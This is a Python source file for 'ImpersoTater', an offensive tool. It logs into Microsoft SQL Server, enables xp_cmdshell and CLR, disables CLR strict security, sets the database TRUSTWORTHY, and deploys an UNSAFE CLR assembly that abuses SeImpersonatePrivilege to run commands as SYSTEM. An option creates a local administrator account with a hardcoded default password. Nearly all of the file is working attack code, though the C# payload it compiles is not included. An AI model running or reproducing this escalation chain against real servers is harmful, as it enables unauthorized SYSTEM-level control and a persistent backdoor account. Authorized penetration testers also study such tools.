#!/usr/bin/env python3
"""ImpersoTater — In-memory SeImpersonatePrivilege escalation via MSSQL CLR assembly

Deploys a CLR stored procedure into SQL Server that exploits
SeImpersonatePrivilege to execute commands as NT AUTHORITY\\SYSTEM
without writing any executable to disk. The entire payload runs
inside the sqlservr.exe process.

Usage:
  ImpersoTater [domain/]user[:pass]@host -c "whoami"
  ImpersoTater -u sa -p Password1 -t 10.0.0.5 -c "whoami /all"
  ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user
"""

import os
import sys

_DIR = os.path.dirname(os.path.abspath(os.path.realpath(__file__)))

# Auto-activate project venv when running under system Python
_VENV = os.path.join(_DIR, '.venv')
_VENV_PYTHON = os.path.join(_VENV, 'bin', 'python3')
if (os.path.isdir(_VENV)
        and os.path.isfile(_VENV_PYTHON)
        and not sys.prefix.startswith(os.path.realpath(_VENV))):
    try:
        os.execv(_VENV_PYTHON, [_VENV_PYTHON] + sys.argv)
    except OSError:
        pass

import argparse
import io
import re
import shutil
import subprocess
import tempfile


def mssql_connect(host, port, username, password, domain, windows_auth):
    from impacket import tds
    sql = tds.MSSQL(host, int(port))
    sql.connect()
    sql.socket.settimeout(60)
    if windows_auth:
        ok = sql.login(None, username, password, domain, None, True)
    else:
        ok = sql.login(None, username, password, '', None, False)
    if not ok:
        print('[!] MSSQL login failed', file=sys.stderr)
        sys.exit(1)
    return sql


def sql_exec_raw(sql, query):
    """Execute SQL and return text output. Raises ConnectionError on socket/protocol failure."""
    try:
        sql.sql_query(query)
    except Exception as e:
        raise ConnectionError(f'SQL connection lost: {e}') from e
    old = sys.stdout
    sys.stdout = buf = io.StringIO()
    try:
        sql.printRows()
    except Exception:
        pass
    finally:
        sys.stdout = old
    return buf.getvalue().strip()


def compile_dll():
    cs_core = os.path.join(_DIR, 'ImpersoTater.cs')
    cs_sql = os.path.join(_DIR, 'ImpersoTater_sql.cs')

    if not os.path.isfile(cs_core) or not os.path.isfile(cs_sql):
        print('[!] C# source files not found', file=sys.stderr)
        sys.exit(1)

    if not shutil.which('mcs'):
        print('[!] mcs (Mono C# compiler) not found. Run: ./install.sh', file=sys.stderr)
        sys.exit(1)

    fd, dll_path = tempfile.mkstemp(suffix='.dll', prefix='impersotater_')
    os.close(fd)

    cmd = ['mcs', '-target:library', '-out:' + dll_path,
           '-r:System.Data', cs_core, cs_sql]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        try:
            os.remove(dll_path)
        except OSError:
            pass
        print(f'[!] Compilation failed:\n{r.stderr}', file=sys.stderr)
        sys.exit(1)
    print(f'[+] Compiled CLR assembly ({os.path.getsize(dll_path)} bytes)')
    return dll_path


def deploy_clr(sql, dll_path, cmd, technique, strict_was_on):
    """Deploy and execute CLR assembly. Returns result string or None on failure."""
    with open(dll_path, 'rb') as f:
        dll_bytes = f.read()
    hex_str = '0x' + dll_bytes.hex().upper()

    print('[*] Checking prerequisites...')

    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr enabled'")
    if '1' not in out:
        print('[*] Enabling CLR...')
        sql_exec_raw(sql, "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;")

    if strict_was_on:
        print('[*] Temporarily disabling CLR strict security...')
        sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")

    out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
    if 'ImpersoTaterAsm' in out:
        print('[*] Dropping stale assembly from previous run...')
        sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
        sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")

    db_name = sql_exec_raw(sql, "SELECT DB_NAME()")
    if db_name:
        db = db_name.strip().split('\n')[-1].strip()
        if db and db != '-':
            print(f'[*] Setting {db} TRUSTWORTHY ON...')
            sql_exec_raw(sql, f"ALTER DATABASE [{db}] SET TRUSTWORTHY ON;")

    print(f'[*] Deploying CLR assembly ({len(dll_bytes)} bytes)...')
    sql.socket.settimeout(120)
    sql_exec_raw(sql, f"CREATE ASSEMBLY ImpersoTaterAsm FROM {hex_str} WITH PERMISSION_SET = UNSAFE;")

    verify = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
    if 'ImpersoTaterAsm' not in verify:
        print('[!] Assembly deployment failed — not found after CREATE ASSEMBLY', file=sys.stderr)
        return None

    print('[*] Creating stored procedure...')
    sql_exec_raw(sql, """
        CREATE PROCEDURE dbo.ImpersoTaterExec @cmd NVARCHAR(4000), @technique NVARCHAR(100)
        AS EXTERNAL NAME ImpersoTaterAsm.[PotatoProc].ExecWith;
    """)

    verify = sql_exec_raw(sql, "SELECT OBJECT_ID('dbo.ImpersoTaterExec')")
    verify_clean = verify.strip().replace('-', '').replace('\n', '').strip()
    if not verify_clean or verify_clean == 'NULL':
        print('[!] Stored procedure creation failed', file=sys.stderr)
        return None

    print(f'[*] Executing: {cmd}')
    print(f'[*] Technique: {technique}')
    sql.socket.settimeout(180)
    escaped = cmd.replace(chr(39), chr(39)+chr(39))
    result = sql_exec_raw(sql, f"EXEC dbo.ImpersoTaterExec @cmd = N'{escaped}', @technique = N'{technique}';")

    print(f'\n[+] Result:\n{result}')
    return result


def cleanup_clr(sql, restore_strict, restore_xpc=False):
    """Clean up deployed assembly and restore settings. Resilient to partial failures."""
    print('\n[*] Cleaning up...')
    errors = []

    try:
        sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
    except Exception as e:
        errors.append(f'DROP PROCEDURE: {e}')

    try:
        out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
        if 'ImpersoTaterAsm' in out:
            sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")
    except Exception as e:
        errors.append(f'DROP ASSEMBLY: {e}')

    if restore_strict:
        try:
            print('[*] Restoring CLR strict security...')
            sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")
        except Exception as e:
            errors.append(f'CLR strict security: {e}')

    if restore_xpc:
        try:
            print('[*] Restoring xp_cmdshell...')
            sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;")
        except Exception as e:
            errors.append(f'xp_cmdshell: {e}')

    if errors:
        print('[!] Cleanup had errors:', file=sys.stderr)
        for err in errors:
            print(f'    {err}', file=sys.stderr)
    else:
        print('[+] Cleanup complete')


def _ensure_xp_cmdshell(sql):
    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'xp_cmdshell'")
    if '1' in out:
        return False
    sql_exec_raw(sql, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
    sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'xp_cmdshell'")
    if '1' not in out:
        print('[!] Failed to enable xp_cmdshell', file=sys.stderr)
        sys.exit(1)
    return True


def enumerate_target(sql):
    print('\n[*] Enumerating target...')
    info = {}

    out = sql_exec_raw(sql, "SELECT @@VERSION")
    ver_line = out.strip().split('\n')[-1] if out.strip() else ''
    info['version'] = ver_line
    print(f'    SQL Version: {ver_line[:80]}')

    out = sql_exec_raw(sql, "SELECT SYSTEM_USER")
    info['login'] = out.strip().split('\n')[-1].strip() if out.strip() else ''
    print(f'    Login: {info["login"]}')

    out = sql_exec_raw(sql, "SELECT IS_SRVROLEMEMBER('sysadmin')")
    is_sa = '1' in out
    info['sysadmin'] = is_sa
    print(f'    Sysadmin: {is_sa}')

    if not is_sa:
        print('[!] Not sysadmin — CLR deployment requires sysadmin', file=sys.stderr)
        sys.exit(1)

    xpc_was_off = _ensure_xp_cmdshell(sql)
    if xpc_was_off:
        print('    [*] Enabled xp_cmdshell')
    info['xpc_was_off'] = xpc_was_off

    out = sql_exec_raw(sql, "EXEC xp_cmdshell 'whoami /priv'")
    info['privs'] = out
    has_impersonate = 'SeImpersonatePrivilege' in out and 'Enabled' in out
    print(f'    SeImpersonatePrivilege: {has_impersonate}')

    if not has_impersonate:
        print(f'[!] SeImpersonatePrivilege not available', file=sys.stderr)
        print(f'[!] xp_cmdshell returned: {out[:200]}', file=sys.stderr)
        sys.exit(1)

    out = sql_exec_raw(sql, "EXEC xp_cmdshell 'sc query spooler'")
    spooler = 'RUNNING' in out.upper()
    info['spooler'] = spooler
    print(f'    Print Spooler: {"running" if spooler else "stopped/missing"}')

    out = sql_exec_raw(sql, "EXEC xp_cmdshell 'whoami'")
    lines = [l.strip() for l in out.strip().split('\n')
             if l.strip() and l.strip() != 'NULL' and '---' not in l and l.strip() != 'output']
    svc_acct = lines[-1] if lines else '(unknown)'
    info['service_account'] = svc_acct
    print(f'    Service Account: {svc_acct}')

    return info


def build_add_user_cmd(spec):
    if spec == '_generate_':
        user = 'tater'
        passwd = 'Imp3rs0T@ter!'
    elif ':' in spec:
        user, passwd = spec.split(':', 1)
    else:
        print('[!] --add-user format: USER:PASS or omit for auto-generated', file=sys.stderr)
        sys.exit(1)

    print(f'[*] Will create local admin: {user} / {passwd}')
    return f'ADDUSER:{user}:{passwd}'


def parse_args():
    p = argparse.ArgumentParser(
        description='ImpersoTater — In-memory SYSTEM escalation via MSSQL CLR assembly',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    p.add_argument('target_string', nargs='?', metavar='[domain/]user[:pass]@host',
                   help='Impacket-style target string')
    p.add_argument('-t', '--target', metavar='HOST')
    p.add_argument('-P', '--port', default='1433')
    p.add_argument('-u', '--username', metavar='USER')
    p.add_argument('-p', '--password', metavar='PASS')
    p.add_argument('-d', '--domain', metavar='DOMAIN', default='')
    p.add_argument('-w', '--windows-auth', action='store_true',
                   help='Use Windows/domain authentication')
    action = p.add_mutually_exclusive_group(required=True)
    action.add_argument('-c', '--command',
                        help='Command to execute as SYSTEM')
    action.add_argument('--add-user', nargs='?', const='_generate_',
                        metavar='USER:PASS',
                        help='Create local admin. USER:PASS or auto-generated if omitted')
    p.add_argument('--technique', choices=['auto', 'dcom', 'spooler', 'direct'],
                   default='auto', help='Privilege escalation technique (default: auto)')
    p.add_argument('--no-cleanup', action='store_true',
                   help='Leave CLR assembly deployed after execution')
    return p.parse_args()


def apply_target(args):
    ts = args.target_string
    if not ts:
        if not args.target:
            print('[!] Target required: use positional arg or -t', file=sys.stderr)
            sys.exit(1)
        return

    at = ts.rfind('@')
    if at >= 0:
        host = ts[at + 1:]
        prefix = ts[:at]
        m = re.match(r'^(?:(?P<d>[^/]+)/)?(?P<u>[^:]+)(?::(?P<p>.*))?$', prefix)
        if m:
            if m.group('d') and not args.domain:
                args.domain = m.group('d')
            if m.group('u') and not args.username:
                args.username = m.group('u')
            pw = m.group('p')
            if pw is not None and not args.password:
                args.password = pw
        if not args.target:
            args.target = host
    else:
        if not args.target:
            args.target = ts


def _print_manual_cleanup():
    print('[!] Manual cleanup may be needed on the target:', file=sys.stderr)
    print('    DROP PROCEDURE dbo.ImpersoTaterExec;', file=sys.stderr)
    print('    DROP ASSEMBLY ImpersoTaterAsm;', file=sys.stderr)
    print("    EXEC sp_configure 'clr strict security', 1; RECONFIGURE;", file=sys.stderr)
    print("    EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;", file=sys.stderr)


def main():
    args = parse_args()
    apply_target(args)

    if not args.username or not args.password:
        print('[!] Username and password required', file=sys.stderr)
        sys.exit(1)

    windows_auth = args.windows_auth or bool(args.domain)

    print(f'[*] Connecting to {args.target}:{args.port}...')
    sql = mssql_connect(args.target, args.port, args.username, args.password,
                        args.domain, windows_auth)
    print(f'[+] Connected')

    dll_path = None
    strict_was_on = False
    xpc_was_off = False
    needs_cleanup = False

    try:
        info = enumerate_target(sql)
        xpc_was_off = info.get('xpc_was_off', False)

        if args.add_user is not None:
            cmd = build_add_user_cmd(args.add_user)
        else:
            cmd = args.command

        print('\n[*] Deploying CLR assembly...')
        dll_path = compile_dll()

        out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
        strict_was_on = '1' in out

        needs_cleanup = True
        result = deploy_clr(sql, dll_path, cmd, args.technique, strict_was_on)

        if not args.no_cleanup:
            cleanup_clr(sql, strict_was_on, xpc_was_off)
            needs_cleanup = False

    except KeyboardInterrupt:
        print('\n[!] Interrupted', file=sys.stderr)
    except ConnectionError as e:
        print(f'\n[!] Connection lost: {e}', file=sys.stderr)
        if needs_cleanup:
            _print_manual_cleanup()
        needs_cleanup = False
    except Exception as e:
        print(f'\n[!] Error: {e}', file=sys.stderr)
    finally:
        if needs_cleanup:
            try:
                cleanup_clr(sql, strict_was_on, xpc_was_off)
            except Exception:
                _print_manual_cleanup()

        if dll_path:
            try:
                os.remove(dll_path)
            except OSError:
                pass

        try:
            sql.disconnect()
        except Exception:
            pass

    print('\n[*] Done')


if __name__ == '__main__':
    main()
